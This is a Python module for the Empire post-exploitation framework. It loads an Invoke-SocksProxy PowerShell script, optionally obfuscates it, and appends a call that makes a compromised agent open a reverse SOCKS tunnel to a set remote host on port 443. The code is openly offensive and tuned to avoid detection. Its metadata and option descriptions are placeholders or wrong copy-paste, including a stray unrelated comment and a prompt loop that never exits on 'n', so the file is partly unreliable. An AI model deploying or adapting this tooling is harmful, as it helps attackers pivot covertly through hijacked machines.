from __future__ import print_function

from builtins import str
from builtins import object
from lib.common import helpers

class Module(object):

    def __init__(self, mainMenu, params=[]):

        # Metadata info about the module, not modified during runtime
        self.info = {
            # Name for the module that will appear in module menus
            'Name': 'Invoke-SocksProxy',

            # List of one or more authors for the module
            'Author': ['@p3nt4'],

            # More verbose multi-line description of the module
            'Description': ('description line 1 '
                            'description line 2'),

            'Software': 'SXXXX',

            'Techniques': ['TXXXX', 'TXXXX'],

            # True if the module needs to run in the background
            'Background': True,

            # File extension to save the file as
            'OutputExtension': None,

            # True if the module needs admin rights to run
            'NeedsAdmin': False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # The language for this module
            'Language': 'powershell',

            # The minimum PowerShell version needed for the module to run
            'MinLanguageVersion': '2',

            # List of any references/other comments
            'Comments': [
                'comment',
                'http://link/'
            ]
        }

        # Any options needed by the module, settable during runtime
        self.options = {
            # Format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description': 'Agent to grab a screenshot from.',
                'Required': True,
                'Value': ''
            },
            'remoteHost': {
                'Description': 'Command to execute',
                'Required': True,
                'Value': '192.168.139.92'
            },
            'remotePort': {
                'Description': 'Command to execute',
                'Required': True,
                'Value': '443'
            },
            'useSystemProxy': {
                'Description': 'Command to execute',
                'Required': False,
                'Value': ''
            },
            'certFingerprint': {
                'Description': 'Command to execute',
                'Required': False,
                'Value': ''
            },
            'maxRetries': {
                'Description': 'Command to execute',
                'Required': False,
                'Value': ''
            }
        }

        # Save off a copy of the mainMenu object to access external
        #   functionality like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters are passed as
        #   an object set to the module and the options dictionary is
        #   automatically set. This is mostly in case options are passed on
        #   the command line.
        if params:
            for param in params:
                # Parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-SocksProxy.psm1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "\nInvoke-ReverseSocksProxy"

        # Add any arguments to the end execution of the script
        for option, values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath,
                                          obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        script = helpers.keyword_obfuscation(script)

        cert_path = '/home/kali/Empire/data/misc/InvokeSocksProxy/cert.pem'
        private_key_path = '/home/kali/Empire/data/misc/InvokeSocksProxy/private.key'

        print(helpers.color("[*] Start your Invoke-SocksProxy server before continuing."))
        print(helpers.color("[*] Follow directions at git clone https://github.com/BC-SECURITY/Invoke-SocksProxy.git"))

        while True:
            a = input(helpers.color("[>] Are you sure you want to continue [n/Y]: "))
            if (a.lower() == 'y'):
                break
            else:
                # age was successfully parsed, and we're happy with its value.
                # we're ready to exit the loop.
                continue

        return script


